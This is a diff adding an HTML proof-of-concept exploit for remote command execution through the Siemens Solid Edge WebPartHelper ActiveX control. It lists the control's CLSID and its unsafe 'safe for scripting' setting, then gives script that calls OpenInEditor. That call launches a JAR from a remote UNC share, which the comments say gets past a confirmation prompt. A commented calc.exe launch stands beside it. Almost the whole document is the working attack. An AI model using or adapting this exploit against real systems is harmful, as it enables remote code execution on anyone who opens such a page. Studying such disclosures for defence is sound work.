@@ -1,0 +1,26 @@
+&lt;!--
+SIEMENS Solid Edge WebPartHelper ActiveX Control RFMSsvs!JShellExecuteEx
+Remote Command Execution PoC
+ 
+CLSID: {DD568718-FF20-48EA-973F-0BD5C9FCA522}
+Progid: SolidEdge.WebPartHelper.1
+Binary Path: C:\Program Files\Solid Edge ST4\Program\WPHelper.dll
+Implements IObjectSafety: True
+Safe For Initialization (IObjectSafety): False
+Safe For Scripting (IObjectSafety): True
+--&gt;
+&lt;!-- saved from url=(0014)about:internet --&gt;
+&lt;html&gt;
+&lt;script&gt;
+ 
+  var obj = new ActiveXObject(&quot;SolidEdge.WebPartHelper.1&quot;);
+    
+  //launch calc.exe
+  //obj.OpenInEditor(&quot;c:\\windows\\system32\\calc.exe&quot;);
+ 
+  //bypass the confirmation box, JRE/JDK7u21
+  obj.OpenInEditor(&quot;\\\\192.168.0.1\\uncshare\\CmdExec.jar&quot;);
+ 
+ 
+&lt;/script&gt;
+
